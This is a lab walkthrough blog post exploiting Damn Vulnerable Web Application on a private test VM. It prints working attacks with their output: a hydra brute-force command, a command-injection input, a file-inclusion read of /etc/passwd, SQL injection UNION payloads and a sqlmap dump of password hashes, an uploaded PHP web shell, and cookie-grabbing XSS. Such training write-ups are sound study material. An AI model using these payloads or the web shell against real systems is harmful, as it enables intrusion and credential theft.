+++
categories = ["web", "php"]
description = ""
keywords = []
date = "2015-02-02T08:40:17Z"
title = "Exploring Damn Vulnerable Web Application"

+++

## Intro

Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.

<!--more-->

In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7). 
We will use the version that is bundled in the [Metasploitable 2][meta2] VM. 
We will use the lowest security setting (*PHPIDS:disabled* and *Security Level:low*). 

## 1. Brute Force

Our first task is to brute force HTTP based login form:

![Brute Force](/images/bf.png)

Using *burp* we find that parameters are transmitted via URL:

`http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login#`

And our session data:

`Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28`

Using this information we can use `hydra` to brute force the login form:

```
root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28"
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.52.129   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
```

We found valid login credentials: `admin:password` 

## 2. Command Execution

![Command Execution](/images/ce.png)

This part of the app gives the current user the ability to ping a host.
However it uses a vulnerable piece of code:

`$cmd = shell_exec( 'ping  -c 3 ' . $target );`

Since we control the `$target` variable, we can use `;` or `||` to stack commands.

Using `127.0.0.1;ls -al` as input we get:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
```

## 3. Cross Site Request Forgery

![CSRF](/images/csrf.png)

CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
In our case the password change operation results in the following request:

`http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#`

If we can trick an authenticated user to make this request, we can change this user's password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside `img`, `iframe` tags or inside malicious javascript code.

## 4. File Inclusion

![File Inclusion](/images/fi.png)

This one is pretty straight forward. We can change the `page` variable to display sensitive information: 

`http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh 
lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
dhcp:x:101:102::/nonexistent:/bin/false 
syslog:x:102:103::/home/syslog:/bin/false 
klog:x:103:104::/home/klog:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
bind:x:105:113::/var/cache/bind:/bin/false 
postfix:x:106:115::/var/spool/postfix:/bin/false 
ftp:x:107:65534::/home/ftp:/bin/false 
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
distccd:x:111:65534::/:/bin/false 
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
service:x:1002:1002:,,,:/home/service:/bin/bash 
telnetd:x:112:120::/nonexistent:/bin/false 
proftpd:x:113:65534::/var/run/proftpd:/bin/false 
statd:x:114:65534::/var/lib/nfs:/bin/false 
snmp:x:115:65534::/var/lib/snmp:/bin/false 
```

## 5.1 SQL Injection

![SQLI](/images/sqli.png)

User input is unfiltered and used in the following query:

**`SELECT first_name, last_name FROM users WHERE user_id = '$id'`**

If we enter **' or 1=1-- -** as an id then the query becomes:

**`SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1`**

which makes the WHERE clause always true and shows us all the records:

```
ID: 'or 1=1-- -
First name: admin
Surname: admin

ID: 'or 1=1-- -
First name: Gordon
Surname: Brown

ID: 'or 1=1-- -
First name: Hack
Surname: Me

ID: 'or 1=1-- -
First name: Pablo
Surname: Picasso

ID: 'or 1=1-- -
First name: Bob
Surname: Smith
```

Using **UNION** keyword we can extract any information available to the app's user from the database.

**`' union select database(),null -- -`**

```
ID: ' union select database(),null -- -
First name: dvwa
Surname: 
```

**`' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -`**

```
ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
First name: guestbook
Surname: 

ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
First name: users
Surname: 

```

**` ' union select column_name,null from information_schema.columns where table_name='users'-- -`**

```
ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: user_id
Surname: 

ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: first_name
Surname: 

ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: last_name
Surname: 

ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: user
Surname: 

ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: password
Surname: 

ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
First name: avatar
Surname: 
```

**` ' union select user, password from users-- -`**

```
ID: ' union select user, password from users-- -
First name: admin
Surname: 098f6bcd4621d373cade4e832627b4f6

ID: ' union select user, password from users-- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: ' union select user, password from users-- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: ' union select user, password from users-- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: ' union select user, password from users-- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Looks like the passwords are MD5 hashed. However, they are easily found to be `test`, `abc123`, `charley`, `letmein` and `password` respectively. 

## 5.2 SQL Injection(Blind)

The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
We can use `sqlmap` to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)

```
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28" --dump

Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
```

## 6. File Upload

![File Upload](/images/up.png)

On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:

```
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>
```

`../../hackable/uploads/shell.php succesfully uploaded!`

We can execute commands now via this shell:

`http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al`

## 7.1 Reflected XSS

![XSS](/images/xss.png)

Here whatever we enter gets included into page source. 

`<script>alert(document.cookie)</script>`

![Cookie](/images/cookie.png)

## 7.2 Stored XSS

![XSS](/images/xss2.png)

Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.

![Stored XSS](/images/stored.png)

## Summary

DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo. 

[meta2]: http://sourceforge.net/projects/metasploitable/files/Metasploitable2/
